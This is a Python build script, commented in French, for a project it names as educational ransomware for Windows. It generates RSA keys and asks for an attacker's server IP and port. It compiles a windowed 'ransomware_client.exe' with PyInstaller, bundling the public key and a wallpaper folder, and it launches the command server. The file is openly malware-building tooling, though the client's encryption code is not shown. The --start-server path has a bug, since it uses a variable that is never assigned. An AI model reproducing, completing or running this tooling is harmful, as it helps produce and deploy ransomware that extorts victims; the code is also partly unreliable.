import os
import subprocess
import shutil
import signal
import sys
import time
import configparser
import argparse
import platform
from tools.utils import resource_path
from tqdm import tqdm
from colorama import Fore, init
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# Initialiser colorama
init(autoreset=True)

Ascii_Banner="""
██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗ █████╗  ██████╗  ██████╗  ██████╗  ██████╗
██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║██╔══██╗██╔════╝ ██╔═══██╗██╔════╝ ██╔═══██╗
██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║███████║██║  ███╗██║   ██║██║  ███╗██║   ██║
██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║██╔══██║██║   ██║██║   ██║██║   ██║██║   ██║
██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║██║  ██║╚██████╔╝╚██████╔╝╚██████╔╝╚██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝  ╚═════╝
"""

def load_config():
    config_path = resource_path('server/config.ini')
    config = configparser.ConfigParser()
    config.read(config_path)
    return config

def save_config(config):
    with open('server/config.ini', 'w') as configfile:
        config.write(configfile)

def is_wine_installed():
    # Vérifier si Wine est installé sur le système
    try:
        subprocess.run(['wine', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except FileNotFoundError:
        return False

def generate_rsa_keys():
    print(Fore.CYAN + "Génération des clés RSA...")
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()

    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )

    public_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

    # Créer le dossier 'keys' s'il n'existe pas
    keys_dir = 'keys'
    if not os.path.exists(keys_dir):
        os.makedirs(keys_dir)

    with open(os.path.join(keys_dir, 'private_key.pem'), 'wb') as private_file:
        private_file.write(private_pem)

    with open(os.path.join(keys_dir, 'public_key.pem'), 'wb') as public_file:
        public_file.write(public_pem)

    print(Fore.GREEN + "Clés RSA générées et sauvegardées avec succès.")
    return private_key, public_key

def compile_executable():
    # Détecter le système d'exploitation
    system = platform.system()
    print(Fore.CYAN + f"Système d'exploitation détecté : {system}")

    # Supprimer les dossier dist et build s'ils existent déjà
    if os.path.exists('dist'):
        shutil.rmtree('dist')
    if os.path.exists('build'):
        shutil.rmtree('build')

    # Définir la commande de base
    command = [
        'pyinstaller',
        '--onefile', '--windowed',
        '--noconfirm', '--clean',
        '--name=ransomware_client',
        '--add-data', 'keys/public_key.pem:keys',
        '--add-data', 'server/config.ini:server',
        '--add-data', 'client:client',  # Inclure tout le répertoire client
        '--add-data', 'tools:tools',
        '--add-data', 'wallpaper:wallpaper',
        '--icon=client/favicon.ico',  # Chemin vers l'icône
        'client/client.py'
    ]

    # Si sur Linux, vérifier que Wine est installé
    if system == 'Linux':
        if is_wine_installed():
            command = ['wine'] + command
            print(Fore.YELLOW + "Compilation de l'exécutable sous Wine...")
        else:
            print(Fore.RED + "Wine n'est pas installé. Veuillez installer Wine pour compiler sous Linux.")
            return
    elif system == 'Windows':
        print(Fore.CYAN + "Compilation de l'exécutable...")
    else:
        print(Fore.RED + "Système d'exploitation non pris en charge pour la compilation.")
        return

    # Exécuter la commande
    process = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    stdout, stderr = process.communicate()

    if process.returncode != 0:
        print(Fore.RED + "Erreur lors de la compilation :")
        print(stderr.decode())

    # Afficher une barre de progression pour simuler un chargement
    with tqdm(total=100, desc="Compilation en cours", colour="green") as pbar:
        while process.poll() is None:
            time.sleep(0.1)
            pbar.update(1)
        pbar.update(pbar.total - pbar.n)

    # Afficher le chemin de l'exécutable
    executable_path = os.path.join(os.path.dirname(__file__), 'dist', 'ransomware_client.exe')
    print(Fore.GREEN + "Compilation terminée !")
    print(Fore.CYAN + "L'exécutable a été généré à l'emplacement suivant : " + Fore.LIGHTMAGENTA_EX + f"{executable_path}")

def start_server(local_port):
    # Lancer le serveur
    print(Fore.CYAN + f"Lancement du serveur sur le port local {local_port}...")
    server_process = subprocess.Popen(['python', 'server/server.py', '--port', str(local_port)])

    def signal_handler(sig, frame):
        print(Fore.YELLOW + 'Arrêt du serveur...')
        server_process.terminate()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    server_process.wait()

def main():
    parser = argparse.ArgumentParser(description="Outil de génération de ransomwares pédagogiques pour Windows")
    parser.add_argument('--start-server', action='store_true', help="Lancer le serveur")
    parser.add_argument('--compile', action='store_true', help="Compiler l'exécutable")
    parser.add_argument('--generate-keys', action='store_true', help="Générer une paire de clés RSA")

    args = parser.parse_args()

    # Afficher la bannière ASCII
    print(Fore.LIGHTMAGENTA_EX + Ascii_Banner)

    # Charger la configuration
    config = load_config()

    if args.start_server or args.compile:
        if args.compile:
            # Demander à l'utilisateur l'adresse IP et le numéro de port du serveur pour la connexion client
            server_ip = input(Fore.CYAN + f"Veuillez entrer l'adresse IP du serveur pour la connexion client [{config['SERVER']['client_ip']}] : ") or config['SERVER']['client_ip']
            server_port = input(Fore.CYAN + f"Veuillez entrer le numéro de port du serveur pour la connexion client [{config['SERVER']['client_port']}] : ") or config['SERVER']['client_port']

        # Demander à l'utilisateur le port local pour le serveur
        local_port = input(Fore.CYAN + f"Veuillez entrer le numéro de port local pour le serveur [{config['SERVER']['local_port']}] : ") or config['SERVER']['local_port']

        # Mettre à jour la configuration avec les nouvelles valeurs
        config['SERVER']['client_ip'] = server_ip
        config['SERVER']['client_port'] = server_port
        config['SERVER']['local_port'] = local_port
        save_config(config)

    if args.generate_keys:
        # Générer les clés
        generate_rsa_keys()

    if args.compile:
        # Compiler l'exécutable
        compile_executable()

    if args.start_server:
        # Lancer le serveur
        start_server(local_port)

    if not args.start_server and not args.compile and not args.generate_keys:
        print(Fore.RED + "Veuillez spécifier une option : --start-server, --compile, ou --generate-keys")

if __name__ == "__main__":
    main()